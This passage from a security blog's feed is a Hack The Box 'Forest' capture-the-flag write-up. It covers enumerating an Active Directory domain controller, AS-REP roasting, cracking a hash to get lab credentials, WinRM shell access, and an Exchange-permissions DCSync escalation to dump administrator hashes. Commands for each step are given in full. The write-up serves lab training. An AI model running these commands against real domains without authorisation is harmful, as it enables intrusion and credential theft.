&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49664/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49665/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49666/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49667/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49671/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49677/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49684/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49703/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49945/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2022-02-25T16:33:28
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: 2022-02-25T16:25:55
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 3.1.1:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled and required
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: &amp;lt;blank&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: required
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: FOREST
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: FOREST&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Domain name: htb.local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Forest name: htb.local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FQDN: FOREST.htb.local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2022-02-25T08:33:27-08:00
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is &lt;strong>htb.local&lt;/strong> and
from smb the computer name is &lt;strong>FOREST&lt;/strong>.&lt;/p>
&lt;h3 id="ldap-null-bind">LDAP Null bind&lt;/h3>
&lt;p>LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
for Windows AD, you have to set this up manually.&lt;/p>
&lt;p>By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ldap-search:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Context: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dn: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: top
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| objectClass: domainDNS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| distinguishedName: DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| instanceType: &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenCreated: 2019/09/18 17:45:49 UTC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| whenChanged: 2022/02/25 16:25:45 UTC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>ForestDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: DC&lt;span style="color:#f92672">=&lt;/span>DomainDnsZones,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| subRefs: CN&lt;span style="color:#f92672">=&lt;/span>Configuration,DC&lt;span style="color:#f92672">=&lt;/span>htb,DC&lt;span style="color:#f92672">=&lt;/span>local
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--- snip ---
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can also confirm this using ldapsearch and we see all ldap information.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ldapsearch -h 10.10.10.161 -x -b &lt;span style="color:#e6db74">&amp;#34;DC=htb,DC=local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/forest/forest1.png" class="center" style="border-radius: 8px;" />
&lt;p>Since the output is quite verbose and not easy to digest I&amp;rsquo;ll use &lt;strong>windapsearch&lt;/strong> which is a nicer tool that helps with ldap information.&lt;/p>
&lt;h4 id="users">Users&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
Guest
DefaultAccount
SM_681f53d4942840e18
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1b41c9286325456bb
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
HealthMailbox83d6781
mark
lucinda
santi
andy
HealthMailboxfd87238
sebastien
&lt;/code>&lt;/pre>&lt;h4 id="computers">Computers&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m computers
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
cn: FOREST
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: FOREST.htb.local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
cn: EXCH01
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: EXCH01.htb.local
&lt;/code>&lt;/pre>&lt;h4 id="groups">Groups&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F&lt;span style="color:#ae81ff">\:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;{print $2}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>--- snip ---
Key Admins
Enterprise Key Admins
Organization Management
Recipient Management
UM Management
Help Desk
Discovery Management
Records Management
Public Folder Management
Server Management
View-Only Organization Management
Delegated Setup
Security Reader
Hygiene Management
Security Administrator
Compliance Management
Exchange Servers
Exchange Trusted Subsystem
Managed Availability Servers
Exchange Windows Permissions
ExchangeLegacyInterop
Exchange Install Domain Servers
test
&lt;/code>&lt;/pre>&lt;p>We can go on and on with enumeration but you get the point. From the user accounts list and computers we can see presence of an
Exchange server in the domain, keep this in mind it will be important later.&lt;/p>
&lt;p>At this point we don&amp;rsquo;t yet have any actionable information that could help us get a foothold.&lt;/p>
&lt;h2 id="as-rep-roasting">AS-REP Roasting&lt;/h2>
&lt;p>This attack has been well covered on other posts online, I&amp;rsquo;ll list ones that I like as references.&lt;/p>
&lt;p>We&amp;rsquo;ll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
the attack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/forest/forest2.png" class="center" style="border-radius: 8px;" />
&lt;p>Using the output, I was able to crack the hash with john and get the user&amp;rsquo;s password.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt svc-alfresco.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>svc-alfresco : s3rvice&lt;/strong>&lt;/p>
&lt;h2 id="shell-as-svc-alfresco">Shell as svc-alfresco&lt;/h2>
&lt;p>With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/forest/forest3.png" class="center" style="border-radius: 8px;" />
&lt;p>CME confirms we can connect via winrm.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we have a shell we can look at group memberships for this account.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/forest/forest4.png" class="center" style="border-radius: 8px;" />
&lt;p>From the output we see we are part of several interesting non-default groups.&lt;/p>
&lt;ol>
&lt;li>Remote Management Users - Builtin&lt;/li>
&lt;li>Account Operators - Builtin&lt;/li>
&lt;li>Privileged IT Accounts - Custom&lt;/li>
&lt;li>Service Accounts - Custom&lt;/li>
&lt;/ol>
&lt;p>We know the Remote Management Users group is the one that allowed us winrm access.&lt;/p>
&lt;h3 id="domain-enumeration-with-bloodhound">Domain Enumeration with Bloodhound&lt;/h3>
&lt;p>Since this is a domain controller we can try to find the privilege escalation path using domain information. This is
where bloodhound will come in handy. If you haven&amp;rsquo;t use bloodhound against your AD environment, you should!&lt;/p>
&lt;blockquote>
&lt;p>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment.
Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.&lt;/p>
&lt;p>Source - BloodHound Github page&lt;/p>
&lt;/blockquote>
&lt;p>I recommend you use &lt;a href="https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3" target="_blank" rel="noopener">release 4.0.3&lt;/a>
. For some reason the latest release 4.1.0 (at the time
of writing) didn&amp;rsquo;t work well for me.&lt;/p>
&lt;p>All you need to do is upload SharpHound.exe to the Forest machine, execute it, download the created zip file and upload it to Bloodhound.&lt;/p>
&lt;p>Once uploaded, search for our user svc-alfresco and mark them as owned.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/forest/forest6.png" class="center" style="border-radius: 8px;" />
&lt;p>From there we can try uncover an possible attack path that will lead us to DA. The Pre-Built queries from BloodHound are quite useful. In our case the
&lt;strong>&amp;ldquo;Shortest Paths to Domain Admins from Owned Principals&amp;rdquo;&lt;/strong> will give us a useful path.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/forest/forest7.png" class="center" style="border-radius: 8px;" />
&lt;p>We will get the below graph showing the path to Domain Admin, I have rearranged the nodes for easier view.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/forest/forest5.png" class="center" style="border-radius: 8px;" />
&lt;p>We see the &lt;strong>Account Operators&lt;/strong> group has &lt;em>GenericAll&lt;/em> permissions on &lt;strong>Exchange Windows Permissions&lt;/strong> Group.&lt;/p>
&lt;h3 id="account-operators-group">Account Operators Group&lt;/h3>
&lt;p>By looking at &lt;a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators" target="_blank" rel="noopener">Microsoft documentation&lt;/a>
;&lt;/p>
&lt;blockquote>
&lt;p>The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users,
local groups, and global groups, and members can log in locally to domain controllers.&lt;/p>
&lt;p>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators,
Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.&lt;/p>
&lt;/blockquote>
&lt;p>From the above information, we see that the Account Operators group has permission to create and modify any groups except those listed. Since the Exchange Windows Permissions group
isn&amp;rsquo;t part of this list, it becomes modifiable by default.&lt;/p>
&lt;h3 id="exchange-windows-permissions-group">Exchange Windows Permissions Group&lt;/h3>
&lt;p>Remember the presence of Exchange? When installing Exchange, by default the permissions granted on the domain are too high (I think this is now patched on 2019 version, not sure). When Exchange
is installed, the Exchange Windows Permissions Group has WriteDACL access to the Domain.&lt;/p>
&lt;p>See this article that goes in depth on the subject. &lt;a href="https://adsecurity.org/?p=4119" target="_blank" rel="noopener">https://adsecurity.org/?p=4119&lt;/a>
&lt;/p>
&lt;p>The Exchange Trusted Subsystem Group can also be used as it is a member of the Exchange Windows Permissions Group.&lt;/p>
&lt;p>Now we can chain these two issues to compromise the domain.&lt;/p>
&lt;h2 id="owning-the-domain">Owning the Domain&lt;/h2>
&lt;p>First we&amp;rsquo;ll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>net user pwned &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> /add
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>net group &lt;span style="color:#e6db74">&amp;#34;Exchange Windows Permissions&amp;#34;&lt;/span> pwned /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can then upload PowerView and use it to grant DCSync privileges to the newly created account.&lt;/p>
&lt;p>The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account.
We could also use the svc-alfresco account if we wanted.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>$SecPassword &lt;span style="color:#f92672">=&lt;/span> ConvertTo-SecureString &lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span> -AsPlainText -Force
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$Cred &lt;span style="color:#f92672">=&lt;/span> New-Object System.Management.Automation.PSCredential&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;htb.local\pwned&amp;#39;&lt;/span>, $SecPassword&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity &lt;span style="color:#e6db74">&amp;#39;pwned&amp;#39;&lt;/span> -Rights DCSync
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>secretsdump.py htb.local/pwned:&lt;span style="color:#e6db74">&amp;#39;Pwn3d!!&amp;#39;&lt;/span>@10.10.10.161
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/forest/forest9.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then use the admin hash to get a shell.&lt;/p>
&lt;h2 id="extras">Extras&lt;/h2>
&lt;p>Todo - LDAP queries&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;p>&lt;strong>AS-REP Roasting&lt;/strong>&lt;/p>
&lt;p>&lt;a href="https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html" target="_blank" rel="noopener">https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec" target="_blank" rel="noopener">https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://blog.xpnsec.com/kerberos-attacks-part-2/" target="_blank" rel="noopener">https://blog.xpnsec.com/kerberos-attacks-part-2/&lt;/a>
&lt;/p>
&lt;p>&lt;strong>Exchange and ACL Stuff&lt;/strong>&lt;/p>
&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" target="_blank" rel="noopener">https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed" target="_blank" rel="noopener">https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/" target="_blank" rel="noopener">https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md" target="_blank" rel="noopener">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md&lt;/a>
&lt;/p>
&lt;p>&lt;strong>Other Forest Walkthroughs&lt;/strong>&lt;/p>
&lt;p>&lt;a href="https://0xdf.gitlab.io/2020/03/21/htb-forest.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/03/21/htb-forest.html&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;amp;t=3755s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=3755s&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://vulndev.io/2020/03/21/forest-hackthebox/" target="_blank" rel="noopener">https://vulndev.io/2020/03/21/forest-hackthebox/&lt;/a>
&lt;/p></content></item></channel></rss>